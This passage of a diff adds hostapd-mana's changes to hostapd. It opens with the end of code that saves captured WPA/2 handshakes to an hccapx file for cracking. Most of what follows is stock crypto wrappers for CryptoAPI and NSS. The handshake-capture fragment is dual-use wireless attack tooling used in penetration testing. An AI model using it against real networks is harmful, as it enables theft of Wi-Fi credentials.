> 					fwrite("\x00",1,1,hccapx);
> 				fwrite(key->key_data_length,2,1,hccapx);
> 				fwrite(key+1,WPA_GET_BE16(key->key_data_length),1,hccapx);
> 			}
> 			// Padding
> 			for (i=0;i<(256 - sizeof(*hdr) - ntohs(hdr->length) - (mic_len == 24 ? 8 : 0));i++) {
> 				fwrite("\x00",1,1,hccapx);
> 			}
> 			fclose(hccapx);
> 			wpa_printf(MSG_INFO, "MANA: Captured a WPA/2 handshake from: " MACSTR, MAC2STR(sm->addr));
> 		}
> 	}
> 	//MANA End
> 	
diff '--color=auto' -rN hostapd-2.6/src/common/mana.c hostapd-mana/src/common/mana.c
0a1,18
> /*
>  * hostapd / mana includes
>  * Copyright (c) 2018-2018, singe
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> #include "common/mana.h"
> 
> // Initialise global hostapd config pointer A kludge to access config options
> // in parts of hostapd that don't have the context passed to it without having
> // to rewrite a ton of methods
> // Check src/ap/hostapd.c for where it's initialised
> // 	hostapd_init
> // 	hostapd_reload_config
> struct mana_conf mana = {
> 	.conf = 0
> };
diff '--color=auto' -rN hostapd-2.6/src/common/mana.h hostapd-mana/src/common/mana.h
0a1,18
> /*
>  * hostapd / mana includes
>  * Copyright (c) 2018-2018, singe
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> #include "utils/includes.h"
> 
> #include "utils/common.h"
> #include "ap/ap_config.h"
> 
> // Maintain a global pointer to hostapd config struct for parts of hostapd that
> // don't have it passed in as context
> struct mana_conf {
> 	struct hostapd_config *conf;
> };
> extern struct mana_conf mana;
diff '--color=auto' -rN hostapd-2.6/src/crypto/crypto_cryptoapi.c hostapd-mana/src/crypto/crypto_cryptoapi.c
0a1,783
> /*
>  * Crypto wrapper for Microsoft CryptoAPI
>  * Copyright (c) 2005-2009, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> 
> #include "includes.h"
> #include <windows.h>
> #include <wincrypt.h>
> 
> #include "common.h"
> #include "crypto.h"
> 
> #ifndef MS_ENH_RSA_AES_PROV
> #ifdef UNICODE
> #define MS_ENH_RSA_AES_PROV \
> L"Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)"
> #else
> #define MS_ENH_RSA_AES_PROV \
> "Microsoft Enhanced RSA and AES Cryptographic Provider (Prototype)"
> #endif
> #endif /* MS_ENH_RSA_AES_PROV */
> 
> #ifndef CALG_HMAC
> #define CALG_HMAC (ALG_CLASS_HASH | ALG_TYPE_ANY | ALG_SID_HMAC)
> #endif
> 
> #ifdef __MINGW32_VERSION
> /*
>  * MinGW does not yet include all the needed definitions for CryptoAPI, so
>  * define here whatever extra is needed.
>  */
> 
> static BOOL WINAPI
> (*CryptImportPublicKeyInfo)(HCRYPTPROV hCryptProv, DWORD dwCertEncodingType,
> 			    PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY *phKey)
> = NULL; /* to be loaded from crypt32.dll */
> 
> 
> static int mingw_load_crypto_func(void)
> {
> 	HINSTANCE dll;
> 
> 	/* MinGW does not yet have full CryptoAPI support, so load the needed
> 	 * function here. */
> 
> 	if (CryptImportPublicKeyInfo)
> 		return 0;
> 
> 	dll = LoadLibrary("crypt32");
> 	if (dll == NULL) {
> 		wpa_printf(MSG_DEBUG, "CryptoAPI: Could not load crypt32 "
> 			   "library");
> 		return -1;
> 	}
> 
> 	CryptImportPublicKeyInfo = GetProcAddress(
> 		dll, "CryptImportPublicKeyInfo");
> 	if (CryptImportPublicKeyInfo == NULL) {
> 		wpa_printf(MSG_DEBUG, "CryptoAPI: Could not get "
> 			   "CryptImportPublicKeyInfo() address from "
> 			   "crypt32 library");
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> #else /* __MINGW32_VERSION */
> 
> static int mingw_load_crypto_func(void)
> {
> 	return 0;
> }
> 
> #endif /* __MINGW32_VERSION */
> 
> 
> static void cryptoapi_report_error(const char *msg)
> {
> 	char *s, *pos;
> 	DWORD err = GetLastError();
> 
> 	if (FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
> 			  FORMAT_MESSAGE_FROM_SYSTEM,
> 			  NULL, err, 0, (LPTSTR) &s, 0, NULL) == 0) {
>  		wpa_printf(MSG_DEBUG, "CryptoAPI: %s: %d", msg, (int) err);
> 	}
> 
> 	pos = s;
> 	while (*pos) {
> 		if (*pos == '\n' || *pos == '\r') {
> 			*pos = '\0';
> 			break;
> 		}
> 		pos++;
> 	}
> 
> 	wpa_printf(MSG_DEBUG, "CryptoAPI: %s: %d: (%s)", msg, (int) err, s);
> 	LocalFree(s);
> }
> 
> 
> int cryptoapi_hash_vector(ALG_ID alg, size_t hash_len, size_t num_elem,
> 			  const u8 *addr[], const size_t *len, u8 *mac)
> {
> 	HCRYPTPROV prov;
> 	HCRYPTHASH hash;
> 	size_t i;
> 	DWORD hlen;
> 	int ret = 0;
> 
> 	if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, 0)) {
> 		cryptoapi_report_error("CryptAcquireContext");
> 		return -1;
> 	}
> 
> 	if (!CryptCreateHash(prov, alg, 0, 0, &hash)) {
> 		cryptoapi_report_error("CryptCreateHash");
> 		CryptReleaseContext(prov, 0);
> 		return -1;
> 	}
> 
> 	for (i = 0; i < num_elem; i++) {
> 		if (!CryptHashData(hash, (BYTE *) addr[i], len[i], 0)) {
> 			cryptoapi_report_error("CryptHashData");
> 			CryptDestroyHash(hash);
> 			CryptReleaseContext(prov, 0);
> 		}
> 	}
> 
> 	hlen = hash_len;
> 	if (!CryptGetHashParam(hash, HP_HASHVAL, mac, &hlen, 0)) {
> 		cryptoapi_report_error("CryptGetHashParam");
> 		ret = -1;
> 	}
> 
> 	CryptDestroyHash(hash);
> 	CryptReleaseContext(prov, 0);
> 
> 	return ret;
> }
> 
> 
> int md4_vector(size_t num_elem, const u8 *addr[], const size_t *len, u8 *mac)
> {
> 	return cryptoapi_hash_vector(CALG_MD4, 16, num_elem, addr, len, mac);
> }
> 
> 
> void des_encrypt(const u8 *clear, const u8 *key, u8 *cypher)
> {
> 	u8 next, tmp;
> 	int i;
> 	HCRYPTPROV prov;
> 	HCRYPTKEY ckey;
> 	DWORD dlen;
> 	struct {
> 		BLOBHEADER hdr;
> 		DWORD len;
> 		BYTE key[8];
> 	} key_blob;
> 	DWORD mode = CRYPT_MODE_ECB;
> 
> 	key_blob.hdr.bType = PLAINTEXTKEYBLOB;
> 	key_blob.hdr.bVersion = CUR_BLOB_VERSION;
> 	key_blob.hdr.reserved = 0;
> 	key_blob.hdr.aiKeyAlg = CALG_DES;
> 	key_blob.len = 8;
> 
> 	/* Add parity bits to the key */
> 	next = 0;
> 	for (i = 0; i < 7; i++) {
> 		tmp = key[i];
> 		key_blob.key[i] = (tmp >> i) | next | 1;
> 		next = tmp << (7 - i);
> 	}
> 	key_blob.key[i] = next | 1;
> 
> 	if (!CryptAcquireContext(&prov, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL,
> 				 CRYPT_VERIFYCONTEXT)) {
>  		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptAcquireContext failed: "
> 			   "%d", (int) GetLastError());
> 		return;
> 	}
> 
> 	if (!CryptImportKey(prov, (BYTE *) &key_blob, sizeof(key_blob), 0, 0,
> 			    &ckey)) {
>  		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptImportKey failed: %d",
> 			   (int) GetLastError());
> 		CryptReleaseContext(prov, 0);
> 		return;
> 	}
> 
> 	if (!CryptSetKeyParam(ckey, KP_MODE, (BYTE *) &mode, 0)) {
>  		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptSetKeyParam(KP_MODE) "
> 			   "failed: %d", (int) GetLastError());
> 		CryptDestroyKey(ckey);
> 		CryptReleaseContext(prov, 0);
> 		return;
> 	}
> 
> 	os_memcpy(cypher, clear, 8);
> 	dlen = 8;
> 	if (!CryptEncrypt(ckey, 0, FALSE, 0, cypher, &dlen, 8)) {
> 		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptEncrypt failed: %d",
> 			   (int) GetLastError());
> 		os_memset(cypher, 0, 8);
> 	}
> 
> 	CryptDestroyKey(ckey);
> 	CryptReleaseContext(prov, 0);
> }
> 
> 
> int md5_vector(size_t num_elem, const u8 *addr[], const size_t *len, u8 *mac)
> {
> 	return cryptoapi_hash_vector(CALG_MD5, 16, num_elem, addr, len, mac);
> }
> 
> 
> int sha1_vector(size_t num_elem, const u8 *addr[], const size_t *len, u8 *mac)
> {
> 	return cryptoapi_hash_vector(CALG_SHA, 20, num_elem, addr, len, mac);
> }
> 
> 
> struct aes_context {
> 	HCRYPTPROV prov;
> 	HCRYPTKEY ckey;
> };
> 
> 
> void * aes_encrypt_init(const u8 *key, size_t len)
> {
> 	struct aes_context *akey;
> 	struct {
> 		BLOBHEADER hdr;
> 		DWORD len;
> 		BYTE key[16];
> 	} key_blob;
> 	DWORD mode = CRYPT_MODE_ECB;
> 
> 	if (len != 16)
> 		return NULL;
> 
> 	key_blob.hdr.bType = PLAINTEXTKEYBLOB;
> 	key_blob.hdr.bVersion = CUR_BLOB_VERSION;
> 	key_blob.hdr.reserved = 0;
> 	key_blob.hdr.aiKeyAlg = CALG_AES_128;
> 	key_blob.len = len;
> 	os_memcpy(key_blob.key, key, len);
> 
> 	akey = os_zalloc(sizeof(*akey));
> 	if (akey == NULL)
> 		return NULL;
> 
> 	if (!CryptAcquireContext(&akey->prov, NULL,
> 				 MS_ENH_RSA_AES_PROV, PROV_RSA_AES,
> 				 CRYPT_VERIFYCONTEXT)) {
>  		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptAcquireContext failed: "
> 			   "%d", (int) GetLastError());
> 		os_free(akey);
> 		return NULL;
> 	}
> 
> 	if (!CryptImportKey(akey->prov, (BYTE *) &key_blob, sizeof(key_blob),
> 			    0, 0, &akey->ckey)) {
>  		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptImportKey failed: %d",
> 			   (int) GetLastError());
> 		CryptReleaseContext(akey->prov, 0);
> 		os_free(akey);
> 		return NULL;
> 	}
> 
> 	if (!CryptSetKeyParam(akey->ckey, KP_MODE, (BYTE *) &mode, 0)) {
>  		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptSetKeyParam(KP_MODE) "
> 			   "failed: %d", (int) GetLastError());
> 		CryptDestroyKey(akey->ckey);
> 		CryptReleaseContext(akey->prov, 0);
> 		os_free(akey);
> 		return NULL;
> 	}
> 
> 	return akey;
> }
> 
> 
> void aes_encrypt(void *ctx, const u8 *plain, u8 *crypt)
> {
> 	struct aes_context *akey = ctx;
> 	DWORD dlen;
> 
> 	os_memcpy(crypt, plain, 16);
> 	dlen = 16;
> 	if (!CryptEncrypt(akey->ckey, 0, FALSE, 0, crypt, &dlen, 16)) {
> 		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptEncrypt failed: %d",
> 			   (int) GetLastError());
> 		os_memset(crypt, 0, 16);
> 	}
> }
> 
> 
> void aes_encrypt_deinit(void *ctx)
> {
> 	struct aes_context *akey = ctx;
> 	if (akey) {
> 		CryptDestroyKey(akey->ckey);
> 		CryptReleaseContext(akey->prov, 0);
> 		os_free(akey);
> 	}
> }
> 
> 
> void * aes_decrypt_init(const u8 *key, size_t len)
> {
> 	return aes_encrypt_init(key, len);
> }
> 
> 
> void aes_decrypt(void *ctx, const u8 *crypt, u8 *plain)
> {
> 	struct aes_context *akey = ctx;
> 	DWORD dlen;
> 
> 	os_memcpy(plain, crypt, 16);
> 	dlen = 16;
> 
> 	if (!CryptDecrypt(akey->ckey, 0, FALSE, 0, plain, &dlen)) {
> 		wpa_printf(MSG_DEBUG, "CryptoAPI: CryptDecrypt failed: %d",
> 			   (int) GetLastError());
> 	}
> }
> 
> 
> void aes_decrypt_deinit(void *ctx)
> {
> 	aes_encrypt_deinit(ctx);
> }
> 
> 
> struct crypto_hash {
> 	enum crypto_hash_alg alg;
> 	int error;
> 	HCRYPTPROV prov;
> 	HCRYPTHASH hash;
> 	HCRYPTKEY key;
> };
> 
> struct crypto_hash * crypto_hash_init(enum crypto_hash_alg alg, const u8 *key,
> 				      size_t key_len)
> {
> 	struct crypto_hash *ctx;
> 	ALG_ID calg;
> 	struct {
> 		BLOBHEADER hdr;
> 		DWORD len;
> 		BYTE key[32];
> 	} key_blob;
> 
> 	os_memset(&key_blob, 0, sizeof(key_blob));
> 	switch (alg) {
> 	case CRYPTO_HASH_ALG_MD5:
> 		calg = CALG_MD5;
> 		break;
> 	case CRYPTO_HASH_ALG_SHA1:
> 		calg = CALG_SHA;
> 		break;
> 	case CRYPTO_HASH_ALG_HMAC_MD5:
> 	case CRYPTO_HASH_ALG_HMAC_SHA1:
> 		calg = CALG_HMAC;
> 		key_blob.hdr.bType = PLAINTEXTKEYBLOB;
> 		key_blob.hdr.bVersion = CUR_BLOB_VERSION;
> 		key_blob.hdr.reserved = 0;
> 		/*
> 		 * Note: RC2 is not really used, but that can be used to
> 		 * import HMAC keys of up to 16 byte long.
> 		 * CRYPT_IPSEC_HMAC_KEY flag for CryptImportKey() is needed to
> 		 * be able to import longer keys (HMAC-SHA1 uses 20-byte key).
> 		 */
> 		key_blob.hdr.aiKeyAlg = CALG_RC2;
> 		key_blob.len = key_len;
> 		if (key_len > sizeof(key_blob.key))
> 			return NULL;
> 		os_memcpy(key_blob.key, key, key_len);
> 		break;
> 	default:
> 		return NULL;
> 	}
> 
> 	ctx = os_zalloc(sizeof(*ctx));
> 	if (ctx == NULL)
> 		return NULL;
> 
> 	ctx->alg = alg;
> 
> 	if (!CryptAcquireContext(&ctx->prov, NULL, NULL, PROV_RSA_FULL, 0)) {
> 		cryptoapi_report_error("CryptAcquireContext");
> 		os_free(ctx);
> 		return NULL;
> 	}
> 
> 	if (calg == CALG_HMAC) {
> #ifndef CRYPT_IPSEC_HMAC_KEY
> #define CRYPT_IPSEC_HMAC_KEY 0x00000100
> #endif
> 		if (!CryptImportKey(ctx->prov, (BYTE *) &key_blob,
> 				    sizeof(key_blob), 0, CRYPT_IPSEC_HMAC_KEY,
> 				    &ctx->key)) {
> 			cryptoapi_report_error("CryptImportKey");
> 			CryptReleaseContext(ctx->prov, 0);
> 			os_free(ctx);
> 			return NULL;
> 		}
> 	}
> 
> 	if (!CryptCreateHash(ctx->prov, calg, ctx->key, 0, &ctx->hash)) {
> 		cryptoapi_report_error("CryptCreateHash");
> 		CryptReleaseContext(ctx->prov, 0);
> 		os_free(ctx);
> 		return NULL;
> 	}
> 
> 	if (calg == CALG_HMAC) {
> 		HMAC_INFO info;
> 		os_memset(&info, 0, sizeof(info));
> 		switch (alg) {
> 		case CRYPTO_HASH_ALG_HMAC_MD5:
> 			info.HashAlgid = CALG_MD5;
> 			break;
> 		case CRYPTO_HASH_ALG_HMAC_SHA1:
> 			info.HashAlgid = CALG_SHA;
> 			break;
> 		default:
> 			/* unreachable */
> 			break;
> 		}
> 
> 		if (!CryptSetHashParam(ctx->hash, HP_HMAC_INFO, (BYTE *) &info,
> 				       0)) {
> 			cryptoapi_report_error("CryptSetHashParam");
> 			CryptDestroyHash(ctx->hash);
> 			CryptReleaseContext(ctx->prov, 0);
> 			os_free(ctx);
> 			return NULL;
> 		}
> 	}
> 
> 	return ctx;
> }
> 
> 
> void crypto_hash_update(struct crypto_hash *ctx, const u8 *data, size_t len)
> {
> 	if (ctx == NULL || ctx->error)
> 		return;
> 
> 	if (!CryptHashData(ctx->hash, (BYTE *) data, len, 0)) {
> 		cryptoapi_report_error("CryptHashData");
> 		ctx->error = 1;
> 	}
> }
> 
> 
> int crypto_hash_finish(struct crypto_hash *ctx, u8 *mac, size_t *len)
> {
> 	int ret = 0;
> 	DWORD hlen;
> 
> 	if (ctx == NULL)
> 		return -2;
> 
> 	if (mac == NULL || len == NULL)
> 		goto done;
> 
> 	if (ctx->error) {
> 		ret = -2;
> 		goto done;
> 	}
> 
> 	hlen = *len;
> 	if (!CryptGetHashParam(ctx->hash, HP_HASHVAL, mac, &hlen, 0)) {
> 		cryptoapi_report_error("CryptGetHashParam");
> 		ret = -2;
> 	}
> 	*len = hlen;
> 
> done:
> 	if (ctx->alg == CRYPTO_HASH_ALG_HMAC_SHA1 ||
> 	    ctx->alg == CRYPTO_HASH_ALG_HMAC_MD5)
> 		CryptDestroyKey(ctx->key);
> 
> 	os_free(ctx);
> 
> 	return ret;
> }
> 
> 
> struct crypto_cipher {
> 	HCRYPTPROV prov;
> 	HCRYPTKEY key;
> };
> 
> 
> struct crypto_cipher * crypto_cipher_init(enum crypto_cipher_alg alg,
> 					  const u8 *iv, const u8 *key,
> 					  size_t key_len)
> {	
> 	struct crypto_cipher *ctx;
> 	struct {
> 		BLOBHEADER hdr;
> 		DWORD len;
> 		BYTE key[32];
> 	} key_blob;
> 	DWORD mode = CRYPT_MODE_CBC;
> 
> 	key_blob.hdr.bType = PLAINTEXTKEYBLOB;
> 	key_blob.hdr.bVersion = CUR_BLOB_VERSION;
> 	key_blob.hdr.reserved = 0;
> 	key_blob.len = key_len;
> 	if (key_len > sizeof(key_blob.key))
> 		return NULL;
> 	os_memcpy(key_blob.key, key, key_len);
> 
> 	switch (alg) {
> 	case CRYPTO_CIPHER_ALG_AES:
> 		if (key_len == 32)
> 			key_blob.hdr.aiKeyAlg = CALG_AES_256;
> 		else if (key_len == 24)
> 			key_blob.hdr.aiKeyAlg = CALG_AES_192;
> 		else
> 			key_blob.hdr.aiKeyAlg = CALG_AES_128;
> 		break;
> 	case CRYPTO_CIPHER_ALG_3DES:
> 		key_blob.hdr.aiKeyAlg = CALG_3DES;
> 		break;
> 	case CRYPTO_CIPHER_ALG_DES:
> 		key_blob.hdr.aiKeyAlg = CALG_DES;
> 		break;
> 	case CRYPTO_CIPHER_ALG_RC2:
> 		key_blob.hdr.aiKeyAlg = CALG_RC2;
> 		break;
> 	case CRYPTO_CIPHER_ALG_RC4:
> 		key_blob.hdr.aiKeyAlg = CALG_RC4;
> 		break;
> 	default:
> 		return NULL;
> 	}
> 
> 	ctx = os_zalloc(sizeof(*ctx));
> 	if (ctx == NULL)
> 		return NULL;
> 
> 	if (!CryptAcquireContext(&ctx->prov, NULL, MS_ENH_RSA_AES_PROV,
> 				 PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
> 		cryptoapi_report_error("CryptAcquireContext");
> 		goto fail1;
> 	}
> 
> 	if (!CryptImportKey(ctx->prov, (BYTE *) &key_blob,
> 			    sizeof(key_blob), 0, 0, &ctx->key)) {
>  		cryptoapi_report_error("CryptImportKey");
> 		goto fail2;
> 	}
> 
> 	if (!CryptSetKeyParam(ctx->key, KP_MODE, (BYTE *) &mode, 0)) {
>  		cryptoapi_report_error("CryptSetKeyParam(KP_MODE)");
> 		goto fail3;
> 	}
> 
> 	if (iv && !CryptSetKeyParam(ctx->key, KP_IV, (BYTE *) iv, 0)) {
>  		cryptoapi_report_error("CryptSetKeyParam(KP_IV)");
> 		goto fail3;
> 	}
> 
> 	return ctx;
> 
> fail3:
> 	CryptDestroyKey(ctx->key);
> fail2:
> 	CryptReleaseContext(ctx->prov, 0);
> fail1:
> 	os_free(ctx);
> 	return NULL;
> }
> 
> 
> int crypto_cipher_encrypt(struct crypto_cipher *ctx, const u8 *plain,
> 			  u8 *crypt, size_t len)
> {
> 	DWORD dlen;
> 
> 	os_memcpy(crypt, plain, len);
> 	dlen = len;
> 	if (!CryptEncrypt(ctx->key, 0, FALSE, 0, crypt, &dlen, len)) {
>  		cryptoapi_report_error("CryptEncrypt");
> 		os_memset(crypt, 0, len);
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> 
> int crypto_cipher_decrypt(struct crypto_cipher *ctx, const u8 *crypt,
> 			  u8 *plain, size_t len)
> {
> 	DWORD dlen;
> 
> 	os_memcpy(plain, crypt, len);
> 	dlen = len;
> 	if (!CryptDecrypt(ctx->key, 0, FALSE, 0, plain, &dlen)) {
>  		cryptoapi_report_error("CryptDecrypt");
> 		return -1;
> 	}
> 
> 	return 0;
> }
> 
> 
> void crypto_cipher_deinit(struct crypto_cipher *ctx)
> {
> 	CryptDestroyKey(ctx->key);
> 	CryptReleaseContext(ctx->prov, 0);
> 	os_free(ctx);
> }
> 
> 
> struct crypto_public_key {
> 	HCRYPTPROV prov;
> 	HCRYPTKEY rsa;
> };
> 
> struct crypto_private_key {
> 	HCRYPTPROV prov;
> 	HCRYPTKEY rsa;
> };
> 
> 
> struct crypto_public_key * crypto_public_key_import(const u8 *key, size_t len)
> {
> 	/* Use crypto_public_key_from_cert() instead. */
> 	return NULL;
> }
> 
> 
> struct crypto_private_key * crypto_private_key_import(const u8 *key,
> 						      size_t len,
> 						      const char *passwd)
> {
> 	/* TODO */
> 	return NULL;
> }
> 
> 
> struct crypto_public_key * crypto_public_key_from_cert(const u8 *buf,
> 						       size_t len)
> {
> 	struct crypto_public_key *pk;
> 	PCCERT_CONTEXT cc;
> 
> 	pk = os_zalloc(sizeof(*pk));
> 	if (pk == NULL)
> 		return NULL;
> 
> 	cc = CertCreateCertificateContext(X509_ASN_ENCODING |
> 					  PKCS_7_ASN_ENCODING, buf, len);
> 	if (!cc) {
>  		cryptoapi_report_error("CryptCreateCertificateContext");
> 		os_free(pk);
> 		return NULL;
> 	}
> 
> 	if (!CryptAcquireContext(&pk->prov, NULL, MS_DEF_PROV, PROV_RSA_FULL,
> 				 0)) {
>  		cryptoapi_report_error("CryptAcquireContext");
> 		os_free(pk);
> 		CertFreeCertificateContext(cc);
> 		return NULL;
> 	}
> 
> 	if (!CryptImportPublicKeyInfo(pk->prov, X509_ASN_ENCODING |
> 				      PKCS_7_ASN_ENCODING,
> 				      &cc->pCertInfo->SubjectPublicKeyInfo,
> 				      &pk->rsa)) {
>  		cryptoapi_report_error("CryptImportPublicKeyInfo");
> 		CryptReleaseContext(pk->prov, 0);
> 		os_free(pk);
> 		CertFreeCertificateContext(cc);
> 		return NULL;
> 	}
> 
> 	CertFreeCertificateContext(cc);
> 
> 	return pk;
> }
> 
> 
> int crypto_public_key_encrypt_pkcs1_v15(struct crypto_public_key *key,
> 					const u8 *in, size_t inlen,
> 					u8 *out, size_t *outlen)
> {
> 	DWORD clen;
> 	u8 *tmp;
> 	size_t i;
> 
> 	if (*outlen < inlen)
> 		return -1;
> 	tmp = malloc(*outlen);
> 	if (tmp == NULL)
> 		return -1;
> 
> 	os_memcpy(tmp, in, inlen);
> 	clen = inlen;
> 	if (!CryptEncrypt(key->rsa, 0, TRUE, 0, tmp, &clen, *outlen)) {
> 		wpa_printf(MSG_DEBUG, "CryptoAPI: Failed to encrypt using "
> 			   "public key: %d", (int) GetLastError());
> 		os_free(tmp);
> 		return -1;
> 	}
> 
> 	*outlen = clen;
> 
> 	/* Reverse the output */
> 	for (i = 0; i < *outlen; i++)
> 		out[i] = tmp[*outlen - 1 - i];
> 
> 	os_free(tmp);
> 
> 	return 0;
> }
> 
> 
> int crypto_private_key_sign_pkcs1(struct crypto_private_key *key,
> 				  const u8 *in, size_t inlen,
> 				  u8 *out, size_t *outlen)
> {
> 	/* TODO */
> 	return -1;
> }
> 
> 
> void crypto_public_key_free(struct crypto_public_key *key)
> {
> 	if (key) {
> 		CryptDestroyKey(key->rsa);
> 		CryptReleaseContext(key->prov, 0);
> 		os_free(key);
> 	}
> }
> 
> 
> void crypto_private_key_free(struct crypto_private_key *key)
> {
> 	if (key) {
> 		CryptDestroyKey(key->rsa);
> 		CryptReleaseContext(key->prov, 0);
> 		os_free(key);
> 	}
> }
> 
> 
> int crypto_global_init(void)
> {
> 	return mingw_load_crypto_func();
> }
> 
> 
> void crypto_global_deinit(void)
> {
> }
> 
> 
> int crypto_mod_exp(const u8 *base, size_t base_len,
> 		   const u8 *power, size_t power_len,
> 		   const u8 *modulus, size_t modulus_len,
> 		   u8 *result, size_t *result_len)
> {
> 	/* TODO */
> 	return -1;
> }
diff '--color=auto' -rN hostapd-2.6/src/crypto/crypto_nss.c hostapd-mana/src/crypto/crypto_nss.c
0a1,207
> /*
>  * Crypto wrapper functions for NSS
>  * Copyright (c) 2009, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> 
> #include "includes.h"
> #include <nspr/prtypes.h>
> #include <nspr/plarenas.h>
> #include <nspr/plhash.h>
> #include <nspr/prtime.h>
> #include <nspr/prinrval.h>
> #include <nspr/prclist.h>
> #include <nspr/prlock.h>
> #include <nss/sechash.h>
> #include <nss/pk11pub.h>
> 
> #include "common.h"
> #include "crypto.h"
> 
> 
> static int nss_hash(HASH_HashType type, unsigned int max_res_len,
> 		    size_t num_elem, const u8 *addr[], const size_t *len,
> 		    u8 *mac)
> {
> 	HASHContext *ctx;
> 	size_t i;
> 	unsigned int reslen;
> 
> 	ctx = HASH_Create(type);
> 	if (ctx == NULL)
> 		return -1;
> 
> 	HASH_Begin(ctx);
> 	for (i = 0; i < num_elem; i++)
> 		HASH_Update(ctx, addr[i], len[i]);
> 	HASH_End(ctx, mac, &reslen, max_res_len);
> 	HASH_Destroy(ctx);
> 
> 	return 0;
> }
> 
> 
> void des_encrypt(const u8 *clear, const u8 *key, u8 *cypher)
> {
> 	PK11Context *ctx = NULL;
> 	PK11SlotInfo *slot;
> 	SECItem *param = NULL;
> 	PK11SymKey *symkey = NULL;
> 	SECItem item;
> 	int olen;
> 	u8 pkey[8], next, tmp;
> 	int i;
> 
> 	/* Add parity bits to the key */
> 	next = 0;
> 	for (i = 0; i < 7; i++) {
> 		tmp = key[i];
> 		pkey[i] = (tmp >> i) | next | 1;
> 		next = tmp << (7 - i);
> 	}
> 	pkey[i] = next | 1;
> 
> 	slot = PK11_GetBestSlot(CKM_DES_ECB, NULL);
> 	if (slot == NULL) {
> 		wpa_printf(MSG_ERROR, "NSS: PK11_GetBestSlot failed");
> 		goto out;
> 	}
> 
> 	item.type = siBuffer;
> 	item.data = pkey;
> 	item.len = 8;
> 	symkey = PK11_ImportSymKey(slot, CKM_DES_ECB, PK11_OriginDerive,
> 				   CKA_ENCRYPT, &item, NULL);
> 	if (symkey == NULL) {
> 		wpa_printf(MSG_ERROR, "NSS: PK11_ImportSymKey failed");
> 		goto out;
> 	}
> 
> 	param = PK11_GenerateNewParam(CKM_DES_ECB, symkey);
> 	if (param == NULL) {
> 		wpa_printf(MSG_ERROR, "NSS: PK11_GenerateNewParam failed");
> 		goto out;
> 	}
> 
> 	ctx = PK11_CreateContextBySymKey(CKM_DES_ECB, CKA_ENCRYPT,
> 					 symkey, param);
> 	if (ctx == NULL) {
> 		wpa_printf(MSG_ERROR, "NSS: PK11_CreateContextBySymKey("
> 			   "CKM_DES_ECB) failed");
> 		goto out;
> 	}
> 
> 	if (PK11_CipherOp(ctx, cypher, &olen, 8, (void *) clear, 8) !=
> 	    SECSuccess) {
> 		wpa_printf(MSG_ERROR, "NSS: PK11_CipherOp failed");
> 		goto out;
> 	}
> 
> out:
> 	if (ctx)
> 		PK11_DestroyContext(ctx, PR_TRUE);
> 	if (symkey)
> 		PK11_FreeSymKey(symkey);
> 	if (param)
> 		SECITEM_FreeItem(param, PR_TRUE);
> }
> 
> 
> int rc4_skip(const u8 *key, size_t keylen, size_t skip,
> 	     u8 *data, size_t data_len)
> {
> 	return -1;
> }
> 
> 
> int md5_vector(size_t num_elem, const u8 *addr[], const size_t *len, u8 *mac)
> {
> 	return nss_hash(HASH_AlgMD5, 16, num_elem, addr, len, mac);
> }
> 
> 
> int sha1_vector(size_t num_elem, const u8 *addr[], const size_t *len, u8 *mac)
> {
> 	return nss_hash(HASH_AlgSHA1, 20, num_elem, addr, len, mac);
> }
> 
> 
> int sha256_vector(size_t num_elem, const u8 *addr[], const size_t *len,
> 		  u8 *mac)
> {
> 	return nss_hash(HASH_AlgSHA256, 32, num_elem, addr, len, mac);
> }
> 
> 
> void * aes_encrypt_init(const u8 *key, size_t len)
> {
> 	return NULL;
> }
> 
> 
> void aes_encrypt(void *ctx, const u8 *plain, u8 *crypt)
> {
> }
> 
> 
> void aes_encrypt_deinit(void *ctx)
> {
> }
> 
> 
> void * aes_decrypt_init(const u8 *key, size_t len)
> {
> 	return NULL;
> }
> 
> 
> void aes_decrypt(void *ctx, const u8 *crypt, u8 *plain)
> {
> }
> 
> 
> void aes_decrypt_deinit(void *ctx)
> {
> }
> 
> 
> int crypto_mod_exp(const u8 *base, size_t base_len,
> 		   const u8 *power, size_t power_len,
> 		   const u8 *modulus, size_t modulus_len,
> 		   u8 *result, size_t *result_len)
> {
> 	return -1;
> }
> 
> 
> struct crypto_cipher {
> };
> 
> 
> struct crypto_cipher * crypto_cipher_init(enum crypto_cipher_alg alg,
> 					  const u8 *iv, const u8 *key,
> 					  size_t key_len)
> {
> 	return NULL;
> }
> 
> 
> int crypto_cipher_encrypt(struct crypto_cipher *ctx, const u8 *plain,
> 			  u8 *crypt, size_t len)
> {
> 	return -1;
> }
> 
> 
> int crypto_cipher_decrypt(struct crypto_cipher *ctx, const u8 *crypt,
> 			  u8 *plain, size_t len)
> {
> 	return -1;
> }
> 
> 
> void crypto_cipher_deinit(struct crypto_cipher *ctx)
> {
> }
diff '--color=auto' -rN hostapd-2.6/src/crypto/fips_prf_cryptoapi.c hostapd-mana/src/crypto/fips_prf_cryptoapi.c
0a1,19
> /*
>  * FIPS 186-2 PRF for Microsoft CryptoAPI
>  * Copyright (c) 2009, Jouni Malinen <j@w1.fi>
>  *
>  * This software may be distributed under the terms of the BSD license.
>  * See README for more details.
>  */
> 
> #include "includes.h"
> 
> #include "common.h"
> #include "crypto.h"
> 
> 
> int fips186_2_prf(const u8 *seed, size_t seed_len, u8 *x, size_t xlen)
> {
